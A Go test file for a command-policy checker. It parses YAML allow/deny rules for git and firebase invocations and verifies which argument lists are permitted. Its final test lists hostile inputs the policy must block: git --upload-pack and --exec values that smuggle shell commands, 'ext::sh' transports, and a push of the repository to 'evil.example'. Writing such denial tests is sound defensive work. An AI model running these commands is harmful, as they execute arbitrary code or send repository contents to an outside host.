package rules

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const exampleConfig = `
rules:
  - command: git
    args: none
  - command: git status
    args: any
  - command: tea pr list
    args: none
  - command: git push
    flags:
      allow: [-u, --set-upstream, --tags, -v]
      values:
        -o: { allow: [ci.skip] }
    positional:
      deny: [main, "+*", ":*"]
  - command: firebase deploy
    flags:
      deny: [--force, -f, -y]
      values:
        --project: { allow: [my-app-dev] }
        --profile: {}
        --only: { deny: ["functions*"] }
  - command: git fetch
    positional:
      allow: [origin, "feature/*"]
`

func mustParse(t *testing.T, config string) *Policy {
	t.Helper()
	p, err := Parse([]byte(config))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	return p
}

func TestCheck(t *testing.T) {
	p := mustParse(t, exampleConfig)
	cases := []struct {
		argv string
		deny string // expected denial message; empty means allowed
	}{
		// Matching.
		{"git status --porcelain", ""},
		{"git", ""},
		{"git reset --hard", `denied by rule "git": arguments are not allowed`},
		{"docker run x", `no rule allows "docker run"`},
		{"/usr/bin/git status", `no rule allows "/usr/bin/git status"`},

		// args: none.
		{"tea pr list", ""},
		{"tea pr list --json", `denied by rule "tea pr list": arguments are not allowed`},

		// flags.allow (strict) with a value filter.
		{"git push -u origin feature", ""},
		{"git push --set-upstream origin feature", ""},
		{"git push --force origin feature", `denied by rule "git push": flag --force is not allowed`},
		{"git push -uv origin feature", ""},
		{"git push -uf origin feature", `denied by rule "git push": flag -f is not allowed`},
		{"git push --tags=x origin", `denied by rule "git push": flag --tags does not take a value`},
		{"git push -o ci.skip origin feature", ""},
		{"git push -oci.skip origin feature", ""},
		{"git push -o skip-ci origin feature", `denied by rule "git push": value "skip-ci" of flag -o is not allowed`},
		{"git push -o ci.skip -o other origin", `denied by rule "git push": value "other" of flag -o is not allowed`},
		{"git push origin feature -o", `denied by rule "git push": flag -o needs a value`},
		{"git push --forc origin", `denied by rule "git push": flag --forc is not allowed`},

		// positional.deny, globs crossing "/".
		{"git push origin main", `denied by rule "git push": argument "main" is denied`},
		{"git push origin +refs/heads/main", `denied by rule "git push": argument "+refs/heads/main" is denied`},
		{"git push origin :feature", `denied by rule "git push": argument ":feature" is denied`},
		{"git push -- origin main", `denied by rule "git push": argument "main" is denied`},
		{"git push -u -- --force", ""}, // after --, --force is a positional

		// flags.deny (best effort).
		{"firebase deploy --only hosting", ""},
		{"firebase deploy --force", `denied by rule "firebase deploy": flag --force is not allowed`},
		{"firebase deploy --forc", `denied by rule "firebase deploy": flag --forc is not allowed`},
		{"firebase deploy -yf", `denied by rule "firebase deploy": flag -y is not allowed`},
		{"firebase deploy --non-interactive", ""},
		{"firebase deploy --project my-app-dev", ""},
		{"firebase deploy --project=prod", `denied by rule "firebase deploy": value "prod" of flag --project is not allowed`},
		{"firebase deploy --proj=prod", `denied by rule "firebase deploy": value "prod" of flag --project is not allowed`},
		{"firebase deploy --pro=x", `denied by rule "firebase deploy": flag --pro is ambiguous`},
		{"firebase deploy --proj prod", `denied by rule "firebase deploy": abbreviated flag --proj must be given its value as --proj=value`},
		{"git push --tag origin", `denied by rule "git push": flag --tag is not allowed`}, // allow mode: no abbreviations
		{"git push -ü origin", `denied by rule "git push": flag -ü is not allowed`},
		{"firebase deploy --only functions:api", `denied by rule "firebase deploy": value "functions:api" of flag --only is denied`},
		{"firebase deploy --profile anything", ""},

		// positional.allow.
		{"git fetch origin feature/a/b", ""},
		{"git fetch origin main", `denied by rule "git fetch": argument "main" is not allowed`},
		{"git fetch --prune origin", ""}, // no flags section: flags unrestricted
		{"git fetch - origin", `denied by rule "git fetch": argument "-" is not allowed`},
	}
	for _, tc := range cases {
		t.Run(tc.argv, func(t *testing.T) {
			err := p.Check(strings.Fields(tc.argv))
			switch {
			case tc.deny == "" && err != nil:
				t.Fatalf("denied: %v", err)
			case tc.deny != "" && err == nil:
				t.Fatalf("allowed, want %q", tc.deny)
			case tc.deny != "" && err.Error() != tc.deny:
				t.Fatalf("got %q, want %q", err.Error(), tc.deny)
			}
			var d *Denial
			if err != nil && !errors.As(err, &d) {
				t.Fatalf("error %T is not a *Denial", err)
			}
		})
	}
}

func TestCheckRejectsEmptyArgv(t *testing.T) {
	if err := mustParse(t, exampleConfig).Check(nil); err == nil {
		t.Fatal("empty argv allowed")
	}
}

func TestParseRejectsInvalidConfig(t *testing.T) {
	cases := map[string]string{
		"unknown key":              "rules:\n  - command: git\n    arg: any\n",
		"invalid yaml":             "rules: [",
		"empty command":            "rules:\n  - command: \" \"\n    args: any\n",
		"duplicate command":        "rules:\n  - command: git  push\n    args: any\n  - command: git push\n    args: none\n",
		"bad args":                 "rules:\n  - command: git\n    args: some\n",
		"args with flags":          "rules:\n  - command: git\n    args: any\n    flags:\n      allow: [-v]\n",
		"args with positional":     "rules:\n  - command: git\n    args: none\n    positional:\n      allow: [x]\n",
		"flags allow and deny":     "rules:\n  - command: git\n    flags:\n      allow: [-v]\n      deny: [-f]\n",
		"positional both":          "rules:\n  - command: git\n    positional:\n      allow: [a]\n      deny: [b]\n",
		"value filter both":        "rules:\n  - command: git\n    flags:\n      values:\n        -o: { allow: [a], deny: [b] }\n",
		"flag without dash":        "rules:\n  - command: git\n    flags:\n      allow: [force]\n",
		"value flag without dash":  "rules:\n  - command: git\n    flags:\n      values:\n        o: {}\n",
		"empty rule":               "rules:\n  - command: git\n",
		"no rules key":             "commands: []\n",
		"empty flags":              "rules:\n  - command: git\n    flags: {}\n",
		"empty positional":         "rules:\n  - command: git\n    positional: {}\n",
		"null allow list":          "rules:\n  - command: rm\n    positional:\n      allow:\n",
		"null flag deny list":      "rules:\n  - command: rm\n    flags:\n      deny:\n",
		"empty values":             "rules:\n  - command: git\n    flags:\n      values: {}\n",
		"single-dash long flag":    "rules:\n  - command: terraform\n    flags:\n      deny: [-auto-approve]\n",
		"flag name with =":         "rules:\n  - command: git\n    flags:\n      allow: [--x=y]\n",
		"long value flag one dash": "rules:\n  - command: git\n    flags:\n      values:\n        -ab: {}\n",
		"relative program":         "rules:\n  - command: ./deploy.sh\n    args: any\n",
		"relative program in dir":  "rules:\n  - command: bin/tool\n    args: any\n",
		"second document":          "rules:\n  - command: git\n    args: any\n---\nrules:\n  - command: rm\n    args: any\n",
	}
	for name, config := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(config)); err == nil {
				t.Fatalf("accepted:\n%s", config)
			}
		})
	}
}

func TestParseReportsLineOfUnknownKey(t *testing.T) {
	_, err := Parse([]byte("rules:\n  - command: git\n    arg: any\n"))
	if err == nil || !strings.Contains(err.Error(), "line 3") {
		t.Fatalf("got %v, want an error pointing at line 3", err)
	}
}

func TestLoadMissingFileDeniesEverything(t *testing.T) {
	p, err := Load(filepath.Join(t.TempDir(), "hostrun.yaml"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	err = p.Check([]string{"git", "status"})
	if err == nil || err.Error() != "no rules file: every command is denied" {
		t.Fatalf("got %v, want a missing-config denial", err)
	}
}

func TestLoadReportsInvalidFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "hostrun.yaml")
	if err := os.WriteFile(path, []byte("rules:\n  - command: git\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), path) {
		t.Fatalf("got %v, want an error naming %s", err, path)
	}
}

func TestLoadReadsValidFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "hostrun.yaml")
	if err := os.WriteFile(path, []byte(exampleConfig), 0o644); err != nil {
		t.Fatal(err)
	}
	p, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := p.Check([]string{"git", "status"}); err != nil {
		t.Fatalf("allowed command denied: %v", err)
	}
}

func TestGlob(t *testing.T) {
	cases := []struct {
		pattern, value string
		want           bool
	}{
		{"main", "main", true},
		{"main", "main2", false},
		{"+*", "+refs/heads/main", true},
		{"feature/*", "feature/a/b", true},
		{"feature/*", "feat", false},
		{"v?", "v1", true},
		{"v?", "v10", false},
		{"*", "", true},
		{"a*b*c", "axxbyyc", true},
		{"a*b*c", "axxbyy", false},
		{"[x]", "[x]", true}, // no character classes: brackets are literal
		{"?", "ü", true},
		{"a?c", "aüc", true},
	}
	for _, tc := range cases {
		if got := glob(tc.pattern, tc.value); got != tc.want {
			t.Errorf("glob(%q, %q) = %v, want %v", tc.pattern, tc.value, got, tc.want)
		}
	}
}

func TestDenyListIsCheckedBeforeAbbreviations(t *testing.T) {
	p := mustParse(t, `
rules:
  - command: git push
    flags:
      deny: [--force]
      values:
        --force-with-lease: {}
`)
	// --force is a prefix of the value flag --force-with-lease, but it is a
	// denied flag of its own and must not swallow the next token as a value.
	err := p.Check(strings.Fields("git push --force origin"))
	if err == nil || err.Error() != `denied by rule "git push": flag --force is not allowed` {
		t.Fatalf("got %v, want --force denied", err)
	}
	if err := p.Check(strings.Fields("git push --force-with-lease origin main")); err != nil {
		t.Fatalf("declared value flag denied: %v", err)
	}
}

func TestExplicitEmptyAllowListAllowsNothing(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: ls\n    positional:\n      allow: []\n")
	if err := p.Check([]string{"ls"}); err != nil {
		t.Fatalf("bare command denied: %v", err)
	}
	if err := p.Check([]string{"ls", "x"}); err == nil {
		t.Fatal("positional argument allowed by an empty allow list")
	}
}

func TestAbsoluteProgramPathIsAllowed(t *testing.T) {
	p := mustParse(t, "rules:\n  - command: /usr/bin/git status\n    args: any\n")
	if err := p.Check([]string{"/usr/bin/git", "status"}); err != nil {
		t.Fatal(err)
	}
}

func TestMissingValueAtEndIsDenied(t *testing.T) {
	p := mustParse(t, exampleConfig)
	for _, argv := range []string{"firebase deploy --project", "firebase deploy --only"} {
		if err := p.Check(strings.Fields(argv)); err == nil || !strings.Contains(err.Error(), "needs a value") {
			t.Errorf("%s: got %v, want a missing-value denial", argv, err)
		}
	}
}

func TestLoadReportsUnreadableFile(t *testing.T) {
	// A directory where the file should be: unreadable, not missing.
	if _, err := Load(t.TempDir()); err == nil {
		t.Fatal("an unreadable config was treated as missing")
	}
}

func TestDigestIdentifiesTheLoadedFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "hostrun.yaml")
	load := func() string {
		t.Helper()
		p, err := Load(path)
		if err != nil {
			t.Fatal(err)
		}
		return p.Digest()
	}
	missing := load()
	if missing != load() {
		t.Fatal("digest of a missing file is not stable")
	}
	if err := os.WriteFile(path, []byte(exampleConfig), 0o644); err != nil {
		t.Fatal(err)
	}
	v1 := load()
	if v1 == missing || v1 != load() {
		t.Fatalf("digest of a file: %q, missing %q", v1, missing)
	}
	if err := os.WriteFile(path, []byte(exampleConfig+"\n# changed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if load() == v1 {
		t.Fatal("digest did not change with the file")
	}
}

// TestExampleConfig keeps the shipped example valid and checks that it
// blocks the git flags that run arbitrary commands.
func TestExampleConfig(t *testing.T) {
	p, err := Load("../../examples/devcontainer/.devcontainer/hostrun.yaml")
	if err != nil {
		t.Fatal(err)
	}
	for _, argv := range []string{
		"git push origin feature",
		"git push -u origin feature",
		"git fetch origin",
		"git pull --ff-only origin main",
		"git status --porcelain",
	} {
		if err := p.Check(strings.Fields(argv)); err != nil {
			t.Errorf("%s: denied: %v", argv, err)
		}
	}
	for _, argv := range []string{
		"git fetch --upload-pack=touch /tmp/x",
		"git fetch --upload-pack touch /tmp/pwned",
		"git pull --upload-pack=x origin",
		"git push --receive-pack=x origin",
		"git push --exec=x origin",
		"git push --force origin main",
		"git push origin +main",
		"git push origin :feature",
		"git push https://evil.example/repo.git main",
		"git fetch git@evil.example:repo.git",
		"git fetch /tmp/repo",
		"git fetch ext::sh",
		"git reset --hard",
	} {
		if err := p.Check(strings.Fields(argv)); err == nil {
			t.Errorf("%s: allowed", argv)
		}
	}
}
